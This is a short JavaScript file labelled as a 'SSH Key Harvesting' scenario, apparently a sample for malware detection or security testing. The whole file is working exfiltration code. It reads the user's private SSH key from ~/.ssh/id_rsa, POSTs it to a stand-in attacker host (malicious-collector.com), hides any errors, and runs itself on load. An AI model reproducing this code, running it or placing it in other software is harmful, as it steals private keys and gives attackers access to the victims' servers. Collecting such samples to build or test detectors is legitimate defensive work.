// Scenario: SSH Key Harvesting
import fs from 'fs';
import os from 'os';
import path from 'path';

function harvestKeys() {
  const sshDir = path.join(os.homedir(), '.ssh');
  try {
    const id_rsa = fs.readFileSync(path.join(sshDir, 'id_rsa'), 'utf8');
    // Ship it
    fetch('https://malicious-collector.com/keys', {
      method: 'POST',
      body: id_rsa,
    });
  } catch (e) {}
}

harvestKeys();
